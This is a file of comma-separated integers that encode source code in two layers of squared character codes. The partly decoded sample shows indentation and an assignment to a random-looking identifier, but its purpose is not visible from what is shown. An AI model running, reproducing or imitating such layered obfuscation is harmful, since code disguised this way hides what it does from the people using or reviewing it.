3136,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,3249,2500,2401,1936,2500,3025,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2500,2809,2704,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2401,3249,2601,2916,1936,3025,3249,2500,2401,1936,2916,2704,2304,2304,1936,2401,2304,2704,2304,2704,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2401,2916,3136,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2601,2401,2601,2916,1936,2401,2500,2601,2500,2401,1936,2500,3136,2304,3249,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,3025,2601,3249,2916,1936,2916,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2916,3136,3136,3249,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2809,2304,2304,1936,2916,2704,2304,2304,1936,2601,2401,2601,2916,1936,2704,3249,2304,2304,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2704,3025,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2704,2916,2704,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2704,3249,2304,2304,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2304,3136,2401,2916,1936,2500,2916,2304,2401,1936,2601,2401,2601,2916,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2500,2809,2304,2304,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2401,2401,2500,2601,2916,1936,2601,2304,2500,2809,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,3025,2601,3249,2916,1936,2916,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2916,3136,3136,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2500,2809,2304,2304,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2401,2704,2704,2304,2304,1936,2601,2304,2500,2809,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,3025,2601,3249,2916,1936,2916,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2916,3136,3136,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2916,2304,2304,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,2704,2704,3136,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2809,2916,2500,2809,1936,2809,3249,2500,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,3025,3025,2704,2704,1936,2704,2704,3136,3249,1936,3249,2304,2500,2809,1936,2704,2704,3136,3249,1936,2401,2401,2704,2704,3249,1936,3249,2916,2304,2704,1936,2401,2401,2916,2916,2704,1936,2704,3249,2304,2304,1936,3136,2401,2304,2304,1936,3249,2304,2500,2809,1936,2401,2401,2809,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2401,2304,2304,1936,2401,2601,2704,2809,2916,1936,3249,3136,2304,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2500,3025,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,3025,2809,2916,3249,1936,2401,2500,2601,2500,2401,1936,3025,3249,2500,2401,1936,2500,3025,2304,2704,1936,2500,2401,2401,2916,1936,2500,2401,2401,2916,1936,2500,2401,2401,2916,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,2401,2916,2304,2304,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,2704,2704,3136,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2809,2916,2500,2809,1936,2809,3249,2500,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2401,2500,2601,2916,1936,2401,2704,2401,2916,2401,1936,2916,2809,2916,2401,1936,2401,2704,2401,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2601,2304,2500,2809,1936,2601,2304,2500,2809,1936,3025,2304,2809,2916,1936,2401,2704,2704,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2601,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2704,2401,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2401,2304,2500,2809,1936,3025,2304,2809,2916,1936,2809,2601,2500,3249,1936,2401,2704,2704,2304,2304,1936,2401,2704,2401,2916,2401,1936,2916,2809,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2601,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,2809,2601,2500,3249,1936,3025,2304,2809,2916,1936,2809,2601,2500,3249,1936,2916,3136,3136,3249,1936,2401,2704,2401,2916,2401,1936,2916,3136,3136,3249,1936,2916,3136,3136,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2601,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2304,2500,2809,1936,2601,2304,2500,2809,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2916,3136,3136,3249,1936,3025,2304,2809,2916,1936,2401,2401,2304,2500,2809,1936,2916,3136,3136,3249,1936,2916,2809,2916,2401,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2809,2601,2500,3249,1936,3025,2304,2809,2916,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2704,2704,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,2401,2401,2304,2500,2809,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,3025,2304,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2916,3136,3136,3249,1936,2601,2304,2500,2809,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2601,2304,2500,2809,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2704,2704,2304,2304,1936,2401,2401,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,3025,2304,2809,2916,1936,2401,2704,2401,2916,2401,1936,3025,2304,2809,2916,1936,2401,2401,2809,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,